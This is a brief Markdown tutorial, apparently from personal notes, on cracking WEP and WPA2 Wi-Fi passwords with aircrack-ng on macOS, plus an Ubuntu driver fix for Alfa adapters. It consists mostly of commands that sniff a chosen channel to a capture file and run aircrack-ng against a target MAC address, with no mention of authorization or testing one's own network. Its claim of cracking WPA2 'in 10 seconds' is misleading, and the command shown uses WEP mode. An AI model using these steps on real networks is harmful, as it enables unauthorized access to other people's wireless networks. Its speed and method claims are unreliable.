---
title: "Wifi Cracking via Aircrack"
---

Deploy Aircrack for cracking WPA2 / WEP in 10 seconds. Written and based on **MacOS** host.

```
# => install macports
...

# => install aircrack-ng
$ sudo port install aircrack-ng

# => install latest XCode, with all Command Line Tools
...

# => create the following symlink
$ sudo ln -s /System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport /usr/sbin/airport

# => identity channel to sniff 
$ sudo airport -s

# => in another terminal
$ sudo airport en1 sniff [CHANNEL]

# => in another terminal
$ aircrack-ng -1 -a 1 -b [TARGET_MAC_ADDRESS] [CAP_FILE]
```

Note that the *cap_file* will be located in the `/tmp/airportSniff*.cap`.

---

Deploy Aircrack for **Ubuntu 16.04**, you will need to fix **AlfaNetwork** drivers.

```
$ echo "options rt2800pci  nohwcrypt=1" | sudo tee /etc/modprobe.d/rt2800pci.conf
$ sudo modprobe -rfv rt2800pci
$ sudo modprobe -v rt2800pci
```
